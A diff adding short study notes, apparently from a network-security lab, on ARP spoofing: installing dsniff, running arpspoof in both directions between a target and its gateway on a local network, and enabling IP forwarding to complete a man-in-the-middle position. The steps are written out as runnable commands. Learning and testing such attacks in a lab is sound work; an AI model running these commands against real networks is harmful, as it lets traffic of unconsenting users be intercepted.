@@ -1,0 +1,10 @@
+- apt install dsniff
+- telling to the target that i'm the router
+    - arpspoof -i <interface> -t <ip-target> <ip-gateway>
+    - arpspoof -i enp0s3 -t 192.168.0.254 192.168.0.1
+- telling to the router that i'm the victim
+    - arpspoof -i <interface> -t <ip-gateway> <ip-target>
+    - arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.254
+- because the attack machine is not a router, so we need to enable port-forwarding
+    - echo 1 > /proc/sys/net/ipv4/ip_forward
+        - /proc is een virtueel bestandssysteem waarmee je kernelinstellingen live kunt aanpassen
